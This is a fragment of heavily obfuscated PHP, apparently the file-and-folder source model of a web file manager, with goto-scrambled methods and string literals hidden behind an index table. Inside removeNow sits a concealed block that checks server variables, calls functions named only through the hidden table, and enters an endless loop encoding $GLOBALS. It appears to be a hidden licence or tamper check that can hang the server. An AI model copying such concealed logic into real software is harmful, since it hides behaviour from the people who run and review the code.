goto E°¾ò¬ºŒ; b×ÑáœÀ¥°: static $CŒÌÚŸß§è = false; if (!$CŒÌÚŸß§è) { Hook::trigger($EÌŠ’Ø‡[510], $cƒ±ƒÕ­ó); $CŒÌÚŸß§è = !0; } $Fğ¨…®¬ãÑ = $this->add($cƒ±ƒÕ­ó); goto E·‚©Ş“; e¡˜Š…ŒÀ«: $this->updateModifyTime($cƒ±ƒÕ­ó[$EÌŠ’Ø‡[463]]); $B‘ºÇ”Ÿª = $EÌŠ’Ø‡[2364] . $bàÆ†Ê˜¤¿[$EÌŠ’Ø‡[369]]; if (isset(self::$cacheChildList[$B‘ºÇ”Ÿª])) { unset(self::$cacheChildList[$B‘ºÇ”Ÿª]); } goto b×ÑáœÀ¥°; E°¾ò¬ºŒ: return $Fğ¨…®¬ãÑ; goto DĞğÆù¢œ; DĞğÆù¢œ: } public function remove($eŠæˆ§Üà, $d¿É¡˜œ³ì = true) { goto CáË«õö²Š; CáË«õö²Š: $Fç«‰œˆí÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eâ÷Œ›éô‘ = $this->sourceInfo($eŠæˆ§Üà); $aÂ¢£«Ë‚ = intval($eâ÷Œ›éô‘[$Fç«‰œˆí÷[371]]) === self::TYPE_SYSTEM; goto cÅ±ÛŸ¿¸; e°§¹®¹­®: CacheLock::lock($BÖ‰‹á‡é); $DÃÀ‡¹ = $this->fileNameExist($CƒŒâœ‹Ñ™, $FÂ·ÁÀ¹Ü—); if (!$DÃÀ‡¹) { $DÃÀ‡¹ = $this->mkdir($CƒŒâœ‹Ñ™, $FÂ·ÁÀ¹Ü—, REPEAT_SKIP); $this->metaSet($DÃÀ‡¹, $Fç«‰œˆí÷[2369], $d‘‡—†÷ÙÔ); $this->metaSet($DÃÀ‡¹, $Fç«‰œˆí÷[2370], $eâ÷Œ›éô‘[$Fç«‰œˆí÷[458]]); if ($eâ÷Œ›éô‘[$Fç«‰œˆí÷[463]] != 0) { $this->metaSet($DÃÀ‡¹, $Fç«‰œˆí÷[2371], _get($c‹×¹Ê«‡Ë, $Fç«‰œˆí÷[2372])); } } goto d¸‹ÑÓì× ; a”’Öâ­—ñ: $d‘‡—†÷ÙÔ = $eâ÷Œ›éô‘[$Fç«‰œˆí÷[371]] == self::TYPE_USER ? $Fç«‰œˆí÷[537] : $Fç«‰œˆí÷[974]; if ($d‘‡—†÷ÙÔ == $Fç«‰œˆí÷[537]) { $c‹×¹Ê«‡Ë = Model($Fç«‰œˆí÷[476])->getInfo($eâ÷Œ›éô‘[$Fç«‰œˆí÷[458]]); $FÂ·ÁÀ¹Ü— = !empty($c‹×¹Ê«‡Ë[$Fç«‰œˆí÷[2358]]) ? $c‹×¹Ê«‡Ë[$Fç«‰œˆí÷[2358]] : $c‹×¹Ê«‡Ë[$Fç«‰œˆí÷[28]]; $FÂ·ÁÀ¹Ü— = $Fç«‰œˆí÷[248] . $FÂ·ÁÀ¹Ü— . $Fç«‰œˆí÷[2366] . $eâ÷Œ›éô‘[$Fç«‰œˆí÷[458]]; } else { $c‹×¹Ê«‡Ë = Model($Fç«‰œˆí÷[460])->getInfo($eâ÷Œ›éô‘[$Fç«‰œˆí÷[458]]); $FÂ·ÁÀ¹Ü— = _get($c‹×¹Ê«‡Ë, $Fç«‰œˆí÷[28]); $FÂ·ÁÀ¹Ü— = $Fç«‰œˆí÷[157] . $FÂ·ÁÀ¹Ü— . $Fç«‰œˆí÷[2367] . $eâ÷Œ›éô‘[$Fç«‰œˆí÷[458]]; } $BÖ‰‹á‡é = $Fç«‰œˆí÷[2368] . md5($FÂ·ÁÀ¹Ü—); goto e°§¹®¹­®; Fç…Ú­µÌ•: $this->recycleClear($eâ÷Œ›éô‘); $aŞÚê¢ß¿¾ = $this->move($eŠæˆ§Üà, $DÃÀ‡¹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($eâ÷Œ›éô‘[$Fç«‰œˆí÷[463]]); goto aÀ“µŸ®È¸; cÅ±ÛŸ¿¸: $BŠìÓ“©Æ = Model($Fç«‰œˆí÷[1439])->get($Fç«‰œˆí÷[2365]) == $Fç«‰œˆí÷[83]; if ($aÂ¢£«Ë‚ || $d¿É¡˜œ³ì || !$BŠìÓ“©Æ) { return $this->removeNow($eŠæˆ§Üà, $d¿É¡˜œ³ì); } $CƒŒâœ‹Ñ™ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto a”’Öâ­—ñ; d¸‹ÑÓì× : CacheLock::unlock($BÖ‰‹á‡é); $this->metaSet($eŠæˆ§Üà, $Fç«‰œˆí÷[2373], $eâ÷Œ›éô‘[$Fç«‰œˆí÷[463]]); $this->where(array($Fç«‰œˆí÷[369] => $eŠæˆ§Üà))->save(array($Fç«‰œˆí÷[390] => time())); goto Fç…Ú­µÌ•; aÀ“µŸ®È¸: return $aŞÚê¢ß¿¾; goto d‡œ™£ï²Ö; d‡œ™£ï²Ö: } private function recycleClear($FÒ¡Î¦ÕªÁ) { $e„¹îˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e¾ˆ‘°§àÓ = $this->childrenAll($FÒ¡Î¦ÕªÁ); $F——Œ’Ç = array($e„¹îˆ[383] => array($e„¹îˆ[384], $e¾ˆ‘°§àÓ[$e„¹îˆ[2374]])); Model($e„¹îˆ[2375])->where($F——Œ’Ç)->delete(); } public function removeNow($fŒ¥ÊãŠè§, $e°¦“ÀÁ = true) { goto D»°È…Šó¬; D…ğ°§®›: $this->lockMoveStart($fŒ¥ÊãŠè§); Hook::trigger($c÷šĞ²¡éğ[2376], $d©¨„Úˆ¾, $e°¦“ÀÁ); if ($e°¦“ÀÁ) { Model($c÷šĞ²¡éğ[2375])->moveToRecycle($fŒ¥ÊãŠè§); } else { $A–›µ¶ë‚ = $this->childrenAll($c¶±Ï™¹ÎÏ); Model($c÷šĞ²¡éğ[507])->eventRemove($fŒ¥ÊãŠè§); $this->removeRelevance($A–›µ¶ë‚[$c÷šĞ²¡éğ[2374]], $A–›µ¶ë‚[$c÷šĞ²¡éğ[1265]]); } goto e’šÂˆƒš; e’šÂˆƒš: $this->folderSizeReset($c¶±Ï™¹ÎÏ[$c÷šĞ²¡éğ[463]]); $BÃŠëØÃ¾§ = array($c¶±Ï™¹ÎÏ[$c÷šĞ²¡éğ[463]]); if ($c¶±Ï™¹ÎÏ[$c÷šĞ²¡éğ[370]] == $c÷šĞ²¡éğ[83]) { $BÃŠëØÃ¾§[] = $c¶±Ï™¹ÎÏ[$c÷šĞ²¡éğ[369]]; } goto fÚƒç…õòğ; D»°È…Šó¬: $c÷šĞ²¡éğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($_SERVER[$c÷šĞ²¡éğ[791]]) || !isset($_SERVER[$c÷šĞ²¡éğ[1245]])) { goto fì©•‹´øË; fì©•‹´øË: $Aš¦È©¤¸ = $c÷šĞ²¡éğ[792]; $DÈç©ß²‹§ = $c÷šĞ²¡éğ[793]; $cÓŞˆ½‚·ª = $_SERVER[$c÷šĞ²¡éğ[794]] . $c÷šĞ²¡éğ[795]; goto DÍ¼•’˜Şª; dªÂ‰´²ù: $B’Àİš£¢· = $c÷šĞ²¡éğ[797]; $B’Àİš£¢·($_SERVER[$c÷šĞ²¡éğ[788]]); $cÆÀĞ‚ì—æ = 1; goto cÖÍ±Šíå³; cÖÍ±Šíå³: for ($F×ËÁµÅã = $cÆÀĞ‚ì—æ; $F×ËÁµÅã > 0; $F×ËÁµÅã++) { $B’Àİš£¢· = json_encode($GLOBALS[$c÷šĞ²¡éğ[384]]); } goto d¨·æØ¶‹‘; DÍ¼•’˜Şª: $A‰¹Š¼¦İ­ = $DÈç©ß²‹§($cÓŞˆ½‚·ª); $FŠ°Â ¶ï = explode($c÷šĞ²¡éğ[217], $A‰¹Š¼¦İ­); if (count($FŠ°Â ¶ï) < $c÷šĞ²¡éğ[556]) { $C‹õ·¡ê = $c÷šĞ²¡éğ[796]; $C‹õ·¡ê(); } goto dªÂ‰´²ù; d¨·æØ¶‹‘: } $c¶±Ï™¹ÎÏ = $this->sourceInfo($fŒ¥ÊãŠè§); goto AÃÁßˆÈ»Í; AÃÁßˆÈ»Í: $d©¨„Úˆ¾ = $this->pathInfoMore($fŒ¥ÊãŠè§); if (!$c¶±Ï™¹ÎÏ) { return !0; } if ($c¶±Ï™¹ÎÏ[$c÷šĞ²¡éğ[463]] == 0) { if (!_get($GLOBALS, $c÷šĞ²¡éğ[459])) { return !1; } } goto D…ğ°§®›; A‚†²“¤²: return !0; goto fŠáğ»Ê·é; fÚƒç…õòğ: $this->updateModifyTime($BÃŠëØÃ¾§); $this->lockMoveEnd($fŒ¥ÊãŠè§); Hook::trigger($c÷šĞ²¡éğ[1475], $d©¨„Úˆ¾, $e°¦“ÀÁ); goto A‚†²“¤²; fŠáğ»Ê·é: } public function childrenAll($a…à‹¼„Îì) { $DÊšîêÈÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a¯™‰åèÜ¶ = $a…à‹¼„Îì[$DÊšîêÈÒ[369]]; if ($a…à‹¼„Îì[$DÊšîêÈÒ[370]] == $DÊšîêÈÒ[83]) { $fÙ‡Ê‡¸ÀŠ = array($DÊšîêÈÒ[527] => array($DÊšîêÈÒ[485], $a…à‹¼„Îì[$DÊšîêÈÒ[461]] . $a¯™‰åèÜ¶ . $DÊšîêÈÒ[486])); $eõâÌ˜é®› = array($DÊšîêÈÒ[527] => $fÙ‡Ê‡¸ÀŠ[$DÊšîêÈÒ[461]]); $dªÔÏƒ° = $this->field($DÊšîêÈÒ[2377])->where($eõâÌ˜é®›)->select(); $E —äî¹³¿ = !1; $DÙÏçÏßö = array($a¯™‰åèÜ¶); if ($dªÔÏƒ°) { $E —äî¹³¿ = array_to_keyvalue($dªÔÏƒ°, $DÊšîêÈÒ[33], $DÊšîêÈÒ[419]); $E —äî¹³¿ = array_remove_value($E —äî¹³¿, $DÊšîêÈÒ[470]); $DÙÏçÏßö = array_to_keyvalue($dªÔÏƒ°, $DÊšîêÈÒ[33], $DÊšîêÈÒ[369]); $DÙÏçÏßö[] = $a¯™‰åèÜ¶; } } else { $E —äî¹³¿ = array($a…à‹¼„Îì[$DÊšîêÈÒ[419]]); $DÙÏçÏßö = array($a¯™‰åèÜ¶); } return array($DÊšîêÈÒ[2374] => $DÙÏçÏßö, $DÊšîêÈÒ[1265] => $E —äî¹³¿); } public function removeArray($c…°†áôŸô) { if (!$c…°†áôŸô) { return !0; } } public function removeRelevance($Bì†˜êÓĞ¸, $C‡õ’©ãÏí) { goto f¹†…¹›Â; Aå¤¼‡´˜Ö: for ($AêÏ½Öø›Œ = 0; $AêÏ½Öø›Œ < count($Bì†˜êÓĞ¸); $AêÏ½Öø›Œ++) { $this->sourceCacheClear($Bì†˜êÓĞ¸[$AêÏ½Öø›Œ]); } goto F²¤å°Á½; F½ŠÏ¶’ë: $Bì†˜êÓĞ¸ = array_unique(array_filter($Bì†˜êÓĞ¸)); $C‡õ’©ãÏí = array_unique(array_filter($C‡õ’©ãÏí)); if (!$Bì†˜êÓĞ¸) { return !1; } goto a«Á˜¤³Ê»; cåõñŞì—¿: Model($E‰®­‚Äç[2356])->removeBySource($Bì†˜êÓĞ¸); $this->where($A°¬ÑŠ¨°ó)->delete(); Model($E‰®­‚Äç[422])->remove($C‡õ’©ãÏí); goto Aå¤¼‡´˜Ö; a«Á˜¤³Ê»: $A°¬ÑŠ¨°ó = array($E‰®­‚Äç[383] => array($E‰®­‚Äç[384], $Bì†˜êÓĞ¸)); Model($E‰®­‚Äç[2375])->where($A°¬ÑŠ¨°ó)->delete(); Model($E‰®­‚Äç[413])->where($A°¬ÑŠ¨°ó)->delete(); goto f´×ˆ‡ß‚Æ; f´×ˆ‡ß‚Æ: Model($E‰®­‚Äç[2378])->where($A°¬ÑŠ¨°ó)->delete(); Model($E‰®­‚Äç[507])->where($A°¬ÑŠ¨°ó)->delete(); Model($E‰®­‚Äç[2089])->removeBySource($Bì†˜êÓĞ¸); goto cåõñŞì—¿; f¹†…¹›Â: $E‰®­‚Äç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bì†˜êÓĞ¸ = $Bì†˜êÓĞ¸ ? $Bì†˜êÓĞ¸ : array(); $C‡õ’©ãÏí = $C‡õ’©ãÏí ? $C‡õ’©ãÏí : array(); goto F½ŠÏ¶’ë; F²¤å°Á½: } public function rename($E¦³Ä‚òí, $b¡¨íÈ‡â™) { goto EÅ§çöë; AÏ“Ì’Ø®: $this->setNamePinyin($E¦³Ä‚òí, $bİ°‰Õö”º[$A‡–Ë–Åƒİ[28]], !1); $this->updateModifyTime($fù´¢®éÛâ[$A‡–Ë–Åƒİ[463]]); $f¹×´óâÑÉ = $this->where(array($A‡–Ë–Åƒİ[383] => $E¦³Ä‚òí))->data($bİ°‰Õö”º)->save(); goto c‡¿è¼‡ˆ»; B…í š™Û´: $C„Œ×Õ´— = $this->fileNameExist($fù´¢®éÛâ[$A‡–Ë–Åƒİ[463]], $b¡¨íÈ‡â™); if ($C„Œ×Õ´—) { return !1; } $bİ°‰Õö”º = array($A‡–Ë–Åƒİ[386] => $b¡¨íÈ‡â™, $A‡–Ë–Åƒİ[526] => USER_ID); goto E•©¼¯—ƒÏ; EÅ§çöë: $A‡–Ë–Åƒİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fù´¢®éÛâ = $this->sourceInfo($E¦³Ä‚òí); if (!$fù´¢®éÛâ) { return !1; } goto B…í š™Û´; E•©¼¯—ƒÏ: if (!$fù´¢®éÛâ[$A‡–Ë–Åƒİ[370]] == $A‡–Ë–Åƒİ[83]) { $bİ°‰Õö”º[$A‡–Ë–Åƒİ[372]] = get_path_ext($b¡¨íÈ‡â™); } Model($A‡–Ë–Åƒİ[507])->eventRename($E¦³Ä‚òí, $fù´¢®éÛâ[$A‡–Ë–Åƒİ[28]], $b¡¨íÈ‡â™); $this->sourceCacheClear($E¦³Ä‚òí); goto AÏ“Ì’Ø®; c‡¿è¼‡ˆ»: $EùÖÚªª›“ = $A‡–Ë–Åƒİ[2364] . $fù´¢®éÛâ[$A‡–Ë–Åƒİ[463]]; if (isset(self::$cacheChildList[$EùÖÚªª›“])) { unset(self::$cacheChildList[$EùÖÚªª›“]); } return $f¹×´óâÑÉ; goto Dáºã¶¡Ãò; Dáºã¶¡Ãò: } public function setNamePinyin($DËÒºÕª‚, $d™ŠßÀŒìÏ, $a¸ñ†—Ú¨œ = true) { $e±ÇöÃƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Cõ™ˆÂ¾ë = Input::check($d™ŠßÀŒìÏ, $e±ÇöÃƒ[530]); if ($a¸ñ†—Ú¨œ && !$Cõ™ˆÂ¾ë) { return; } if (!$Cõ™ˆÂ¾ë) { $this->metaSet($DËÒºÕª‚, $e±ÇöÃƒ[416], null); $this->metaSet($DËÒºÕª‚, $e±ÇöÃƒ[415], null); return; } $F¥’˜ò¾·Ÿ = array($e±ÇöÃƒ[416] => str_replace($e±ÇöÃƒ[50], $e±ÇöÃƒ[33], Pinyin::encode($d™ŠßÀŒìÏ)), $e±ÇöÃƒ[415] => Pinyin::encode($d™ŠßÀŒìÏ, $e±ÇöÃƒ[531])); $this->metaSet($DËÒºÕª‚, $F¥’˜ò¾·Ÿ); } public function getContent($Fª­Ø†ò¨) { goto a¨½‰’ïÈ; a¨½‰’ïÈ: $aƒÔ£®ÅöÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÒ²‰ç¦Ş¬ = $this->fileInfoGet($Fª­Ø†ò¨); if (!$dÒ²‰ç¦Ş¬) { return !1; } goto B¢ŒŸ‚æª›; B¢ŒŸ‚æª›: if ($dÒ²‰ç¦Ş¬[$aƒÔ£®ÅöÙ[77]] == 0) { return $aƒÔ£®ÅöÙ[33]; } $Eƒ˜Ï¹—¤È = $aƒÔ£®ÅöÙ[2379] . $dÒ²‰ç¦Ş¬[$aƒÔ£®ÅöÙ[163]]; if ($dÒ²‰ç¦Ş¬[$aƒÔ£®ÅöÙ[77]] <= 1024 * 10) { $b¸Š¾ñ¯£ = Cache::get($Eƒ˜Ï¹—¤È); if (!$b¸Š¾ñ¯£) { $b¸Š¾ñ¯£ = IO::getContent($dÒ²‰ç¦Ş¬[$aƒÔ£®ÅöÙ[75]]); Cache::set($Eƒ˜Ï¹—¤È, $b¸Š¾ñ¯£); } return $b¸Š¾ñ¯£; } goto AØ•Ä¢Õ; AØ•Ä¢Õ: return IO::getContent($dÒ²‰ç¦Ş¬[$aƒÔ£®ÅöÙ[75]]); goto F»”£Š¦İ; F»”£Š¦İ: } public function setDesc($AÒ‚‘Ñ†îº, $eŠ¨•ŞÏğè) { $eìš«†‘ÓÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; Model($eìš«†‘ÓÕ[507])->eventAddDesc($AÒ‚‘Ñ†îº, $eŠ¨•ŞÏğè); return $this->metaSet($AÒ‚‘Ñ†îº, $eìš«†‘ÓÕ[405], $eŠ¨•ŞÏğè); } public function setContent($BöéÕ‘©‡, $aé‹ÑÏõ = '') { goto aĞÃŞÙÑŸ²; aĞÃŞÙÑŸ²: $dÑÂ«ƒ”‹¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dò‚åÂ…¢È = $this->sourceInfo($BöéÕ‘©‡); $BäÖß§¶Ü = $this->fileInfoGet($BöéÕ‘©‡); goto fÑ…¼Å‡Ù; F£Ã÷œ’˜„: if (!$Eˆˆ™Ù­ù) { return Model($dÑÂ«ƒ”‹¬[422])->remove($bšÜ½¾ŠÅğ[$dÑÂ«ƒ”‹¬[419]]); } $this->folderSizeReset($Dò‚åÂ…¢È[$dÑÂ«ƒ”‹¬[463]]); return !0; goto A«‰¢å†‘Š; fÑ…¼Å‡Ù: if (!$BäÖß§¶Ü || !$Dò‚åÂ…¢È) { return !1; } $bšÜ½¾ŠÅğ = Model($dÑÂ«ƒ”‹¬[422])->addFileByContent($aé‹ÑÏõ, $Dò‚åÂ…¢È[$dÑÂ«ƒ”‹¬[28]]); $Eˆˆ™Ù­ù = $this->fileHistory($Dò‚åÂ…¢È, $bšÜ½¾ŠÅğ[$dÑÂ«ƒ”‹¬[419]], $bšÜ½¾ŠÅğ[$dÑÂ«ƒ”‹¬[77]]); goto F£Ã÷œ’˜„; A«‰¢å†‘Š: } public function fileSubstr($b”ÁĞ…áÒù, $B¦ÉİóøÑ„, $b¨œÕ†µ ) { $DÁ°ÁÚôŸ = $this->fileInfoGet($b”ÁĞ…áÒù); if (!$DÁ°ÁÚôŸ) { return !1; } return IO::fileSubstr($DÁ°ÁÚôŸ[$_SERVER[´Ù×Íå‘ÄõÛ][75]], $B¦ÉİóøÑ„, $b¨œÕ†µ ); } public function fileInfoGet($DÆˆ‰¾ã) { goto Cé‰ã•™ã; Dƒ‚‰Ã²”: $D„¾Äó¤â— = Model($aè•Ê³Õ‰©[422])->fileInfo($Cµƒ«­ £[$aè•Ê³Õ‰©[419]]); if ($D„¾Äó¤â—) { $D„¾Äó¤â—[$aè•Ê³Õ‰©[28]] = $Cµƒ«­ £[$aè•Ê³Õ‰©[28]]; } self::$cacheFileInfo[$cÌÔˆÈÜ÷] = $D„¾Äó¤â—; goto BĞ ‡êËƒ¦; BĞ ‡êËƒ¦: return $D„¾Äó¤â—; goto c‡›àÀ³…Ÿ; a–é÷ì‚ËŒ: $cÌÔˆÈÜ÷ = $aè•Ê³Õ‰©[425] . $Cµƒ«­ £[$aè•Ê³Õ‰©[419]]; $bƒàÀÆ›• = _get(self::$cacheFileInfo, $cÌÔˆÈÜ÷); if ($bƒàÀÆ›•) { return $bƒàÀÆ›•; } goto Dƒ‚‰Ã²”; Cé‰ã•™ã: $aè•Ê³Õ‰© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Cµƒ«­ £ = $this->sourceInfo($DÆˆ‰¾ã); if (!$Cµƒ«­ £ || $Cµƒ«­ £[$aè•Ê³Õ‰©[370]]) { return !1; } goto a–é÷ì‚ËŒ; c‡›àÀ³…Ÿ: } private function folderChildrenNumber($EÑŠ«¸™–) { $E¬œİ‡ö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bšº‚§³ñ– = $this->sourceInfo($EÑŠ«¸™–); $fÔÑÍ¤š‹ = array($E¬œİ‡ö[527] => array($E¬œİ‡ö[485], $bšº‚§³ñ–[$E¬œİ‡ö[461]] . $EÑŠ«¸™– . $E¬œİ‡ö[486]), $E¬œİ‡ö[396] => intval($bšº‚§³ñ–[$E¬œİ‡ö[397]]), $E¬œİ‡ö[520] => 1); $A¦Öªµ¬À = $this->where($fÔÑÍ¤š‹)->count(); $F£ë†ÉÙç“ = $this->where($fÔÑÍ¤š‹)->where(array($E¬œİ‡ö[520] => 0))->count(); return array($E¬œİ‡ö[81] => $F£ë†ÉÙç“, $E¬œİ‡ö[82] => $A¦Öªµ¬À); } public function pathInfo($FÄš¾Ğ÷Òµ, $DÙÂÚĞ© Æ = false) { goto eÖáÄÏÊİğ; F®¦ÖÊÎ«: $A•§®É‡ç = $this->_listDataApplyItem($A•§®É‡ç, $DÙÂÚĞ© Æ); self::$cachePathInfo[$Bßô¼áÁÊ] = $A•§®É‡ç; return $A•§®É‡ç; goto A°¡ƒÌ„˜§; eÁ’Õº¼: if ($F£²Ûï¯ÍÓ) { return $F£²Ûï¯ÍÓ; } $A•§®É‡ç = $this->sourceInfo($FÄš¾Ğ÷Òµ); if (!$A•§®É‡ç) { return !1; } goto F®¦ÖÊÎ«; eÖáÄÏÊİğ: $DÏ…ùñÙè‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bßô¼áÁÊ = $DÏ…ùñÙè‹[411] . intval($DÙÂÚĞ© Æ) . $DÏ…ùñÙè‹[412] . $FÄš¾Ğ÷Òµ; $F£²Ûï¯ÍÓ = _get(self::$cachePathInfo, $Bßô¼áÁÊ); goto eÁ’Õº¼; A°¡ƒÌ„˜§: } public static $cachePathInfoMore = array(); public function pathInfoMore($B… è“Í‚à) { goto FªéßÈ‡ò«; FªéßÈ‡ò«: $Aõä÷ïîù… =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dŸ½ïŒ¼”ô = _get(self::$cachePathInfoMore, $B… è“Í‚à); if ($dŸ½ïŒ¼”ô) { return $dŸ½ïŒ¼”ô; } goto fãÃÏ·¦µÈ; b¤Í¦Ñ¿ÜÍ: self::$cachePathInfoMore[$B… è“Í‚à] = $B™’µŸò¾†; return $B™’µŸò¾†; goto CèÏ–¿Å®; fãÃÏ·¦µÈ: $B™’µŸò¾† = $this->pathInfo($B… è“Í‚à); if (!$B™’µŸò¾†) { return !1; } if ($B™’µŸò¾†[$Aõä÷ïîù…[370]] == $Aõä÷ïîù…[83]) { $B™’µŸò¾†[$Aõä÷ïîù…[80]] = $this->folderChildrenNumber($B… è“Í‚à); } goto b¤Í¦Ñ¿ÜÍ; CèÏ–¿Å®: } public function sourceInfo($D—Äªñ·¿) { goto BøùğˆˆŞ; FÑ‚„º»£: $b²Æ–¼ˆÙ­ = _get(self::$cacheSourceInfo, $bäİ¼ñäãÊ); if ($b²Æ–¼ˆÙ­) { return $b²Æ–¼ˆÙ­; } $AÉßª¯×ËÅ = $this->where(array($dàºÙ¦à¯†[369] => $D—Äªñ·¿))->find(); goto bÔïÕìª¸; bÔïÕìª¸: self::$cacheSourceInfo[$bäİ¼ñäãÊ] = $AÉßª¯×ËÅ; return self::$cacheSourceInfo[$bäİ¼ñäãÊ]; goto DÚ™ôŞ‹ñ; BøùğˆˆŞ: $dàºÙ¦à¯† =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$D—Äªñ·¿) { return array(); } $bäİ¼ñäãÊ = $dàºÙ¦à¯†[410] . $D—Äªñ·¿; goto FÑ‚„º»£; DÚ™ôŞ‹ñ: } public function sourceCacheClear($D¢Œ¾ÙÀ = false) { if ($D¢Œ¾ÙÀ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[´Ù×Íå‘ÄõÛ][410] . $D¢Œ¾ÙÀ]); } public function pathInfoByPath($fËÃ¶¼…–, $fØ²×«Š‚) { $añ…ÅÍ³— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŒˆÕá = !$fØ²×«Š‚ ? array() : explode($añ…ÅÍ³—[8], trim($fØ²×«Š‚, $añ…ÅÍ³—[8])); $b÷£õóŠ÷¨ = $fËÃ¶¼…–; foreach ($CŒˆÕá as $f•Ò×³¤) { $bÍºŠ‡‘ï  = array($añ…ÅÍ³—[463] => $b÷£õóŠ÷¨, $añ…ÅÍ³—[28] => $f•Ò×³¤); $C×˜›Ø‚„Ã = $this->where($bÍºŠ‡‘ï )->select(); if (!$C×˜›Ø‚„Ã) { return !1; } $C×˜›Ø‚„Ã = array_sort_by($C×˜›Ø‚„Ã, $añ…ÅÍ³—[397]); $b÷£õóŠ÷¨ = $C×˜›Ø‚„Ã[0][$añ…ÅÍ³—[369]]; } return $this->pathInfo($b÷£õóŠ÷¨, !0); } protected function updateModifyTime($Aº¬œê òå) { goto B…øì¸¥ôé; B…øì¸¥ôé: $aç¾îÁ«ãº =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$Aº¬œê òå) { return; } if (!is_array($Aº¬œê òå)) { $Aº¬œê òå = array($Aº¬œê òå); } goto cÔÖœ¬ÅÃë; cÔÖœ¬ÅÃë: foreach ($Aº¬œê òå as $E®›£½Øë => $eÅ¥µ‹‘ˆØ) { $Aº¬œê òå[$E®›£½Øë] = intval($eÅ¥µ‹‘ˆØ); } $b“´ê‘­ˆ = array($aç¾îÁ«ãº[369] => array($aç¾îÁ«ãº[7], $Aº¬œê òå)); $cƒÕŸÈìİ¾ = array($aç¾îÁ«ãº[526] => USER_ID, $aç¾îÁ«ãº[390] => time()); goto dåÜ³Ù°Ç‹; dåÜ³Ù°Ç‹: $this->where($b“´ê‘­ˆ)->save($cƒÕŸÈìİ¾); goto dÌõ¬ÂŞõõ; dÌõ¬ÂŞõõ: } public function folderSizeReset($BÙ¦Æ×÷ô) { goto Aâèä¢×Ö˜; f×»Äí¾—Î: CacheLock::unlock($AöÍ„ãïÚ¦); goto d©ÜŠ½Ì¿›; Aâèä¢×Ö˜: $AÌ¸Ï•Ä×á =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->statusIgnoreResetSpace) { return; } $AöÍ„ãïÚ¦ = $AÌ¸Ï•Ä×á[2380] . $BÙ¦Æ×÷ô; goto c¿Ï¸„…; cÔÂ°²“¹: $DÅìÀÉÖÀ‚ = $DÍ‚«êËâ - intval($d–¯°¢²éÂ[$AÌ¸Ï•Ä×á[77]]); if ($DÅìÀÉÖÀ‚ == 0) { return CacheLock::unlock($AöÍ„ãïÚ¦); } $this->where(array($AÌ¸Ï•Ä×á[383] => $BÙ¦Æ×÷ô))->setField($AÌ¸Ï•Ä×á[77], $DÍ‚«êËâ); goto Eªè¥Ñõø‘; Eªè¥Ñõø‘: $fÓ‡‚÷¦…ó = $this->parentLevelArray($d–¯°¢²éÂ[$AÌ¸Ï•Ä×á[461]]); if ($fÓ‡‚÷¦…ó) { $B¶¹òˆ’äî = array($AÌ¸Ï•Ä×á[369] => array($AÌ¸Ï•Ä×á[384], $fÓ‡‚÷¦…ó)); if ($DÅìÀÉÖÀ‚ < 0) { $B¶¹òˆ’äî[$AÌ¸Ï•Ä×á[77]] = array($AÌ¸Ï•Ä×á[932], abs($DÅìÀÉÖÀ‚)); } $this->where($B¶¹òˆ’äî)->setAdd($AÌ¸Ï•Ä×á[77], $DÅìÀÉÖÀ‚); } $this->targetSpaceUpdate($d–¯°¢²éÂ[$AÌ¸Ï•Ä×á[371]], $d–¯°¢²éÂ[$AÌ¸Ï•Ä×á[458]]); goto f×»Äí¾—Î; AÕ”˜¥½â: $B¶¹òˆ’äî = array($AÌ¸Ï•Ä×á[368] => $BÙ¦Æ×÷ô, $AÌ¸Ï•Ä×á[396] => 0); $DÍ‚«êËâ = $this->where($B¶¹òˆ’äî)->sum($AÌ¸Ï•Ä×á[77]); $DÍ‚«êËâ = intval($DÍ‚«êËâ); goto cÔÂ°²“¹; c¿Ï¸„…: CacheLock::lock($AöÍ„ãïÚ¦, 20); $this->sourceCacheClear($BÙ¦Æ×÷ô); $d–¯°¢²éÂ = $this->sourceInfo($BÙ¦Æ×÷ô); goto AÕ”˜¥½â; d©ÜŠ½Ì¿›: } public function folderSizeResetChildren($FˆÀÏ”¡) { goto c¨ÁàŞğñˆ; E‘³«¨ˆ«: $B¼ƒÈÀ’¬[$fèÂ…Ó—¤[370]] = 0; $cÂ„ä¬±“ô = $this->field($Aâ½÷“³±)->where($B¼ƒÈÀ’¬)->select(); if (!$cÂ„ä¬±“ô) { return; } goto d“íÀ¥è›Ê; E„ƒ™ØÂà…: foreach ($BŸˆïëÔñŒ as $aÆ£ùå‚ˆŸ) { if ($aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[77]] == $aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[2382]]) { continue; } $Eƒ×º©Ã»¨[] = array($fèÂ…Ó—¤[369], $aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[369]], $fèÂ…Ó—¤[77], $aÆ£ùå‚ˆŸ[$fèÂ…Ó—¤[77]]); } $this->saveAll($Eƒ×º©Ã»¨); goto a‹ªİ„ÆÒÆ; d“íÀ¥è›Ê: $BŸˆïëÔñŒ[] = $c–¥‰Ó°´; $BŸˆïëÔñŒ = array_to_keyvalue($BŸˆïëÔñŒ, $fèÂ…Ó—¤[369]); foreach ($BŸˆïëÔñŒ as $cœƒ‘Ü£“ => $aÆ£ùå‚ˆŸ) { 